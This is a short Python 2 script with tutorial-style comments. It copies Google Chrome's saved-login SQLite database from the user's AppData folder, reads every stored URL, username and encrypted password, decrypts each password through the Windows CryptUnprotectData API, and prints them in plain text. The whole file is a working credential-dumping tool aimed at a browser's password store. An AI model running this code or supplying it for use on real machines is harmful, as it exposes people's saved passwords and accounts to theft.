from os import getenv # import the getenv to get the location of Appdata folder
from shutil import copyfile # Copy the sqlite database to avoid db lock error
import sqlite3 # Copy password from sqlite file
import win32crypt   # Library to call windows API CryptUnprotectData for decryption of password





# e.g. output: C:\Users\IEUser\AppData\Local
path = getenv('LOCALAPPDATA')

# Navigate to folder where sqlite database of google password is placed
# C:\Users\IEUser\AppData\Local\Google\Chrome\User Data\Default\Login Data
dbPath = path + "\Google\Chrome\User Data\Default\Login Data"

# Copy the sqlite database to avoid db lock error
copyDbPath = path + "\Google\Chrome\User Data\Default\LoginDataCopy"
copyfile(dbPath, copyDbPath)

# Connect to the copied database
con = sqlite3.connect(copyDbPath)

# Create the cursor to execute the SQL queries
cursor = con.cursor()

# Execute the query
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

# Fetch the rows
for row in cursor.fetchall():

    #Decrypt the password
    password = win32crypt.CryptUnprotectData(row[2])[1]
    print "URL : " + row[0] + "\nUsername : " + row[1] + "\nPassword : " + password + "\n\n\n"
    
con.close()

